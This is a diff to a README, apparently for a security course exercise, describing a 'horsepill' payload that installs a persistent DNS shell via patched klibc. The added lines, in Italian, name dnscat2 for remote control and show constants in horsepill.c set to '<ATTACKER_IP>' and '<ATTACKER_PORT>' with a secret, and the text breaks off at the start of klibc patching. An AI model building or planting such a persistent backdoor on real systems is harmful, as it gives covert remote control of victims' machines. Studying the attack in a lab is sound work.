@@ -1,6 +1,15 @@
 # Horsepill Payload
 _You are requested to produce a payload (using any vector of your choice) that is able to install a DNS shell (see, e.g., [here](https://github.com/sensepost/DNS-Shell)) using the horsepill attack. The payload should survive kernel updates._
 
+## Tunnel DNS
+Il tool utilizzato per controllare il sistema da remoto è [dnscat2](https://github.com/iagox86/dnscat2).
+
+All'interno del file [horsepill.c](src/horsepill.c) è necessario modificare il valore delle seguenti costanti:
+- [`DNSCAT_ARGV2`](src/horsepill.c#L112)` = "server=<ATTACKER_IP>,port=<ATTACKER_PORT>\0";`
+- [`DNSCAT_ARGV3`](src/horsepill.c#L113)` = "--secret=<SECRET>\0";`
+
+> **Nota:** Per la configurazione e l'esecuzione del server far riferimento al link: https://github.com/iagox86/dnscat2
+
 ## `klibc` patching
 Per comodità, creiamo due cartelle di lavoro che consentiranno la creazione del file di _patch_ e la sua applicazione:
 ```
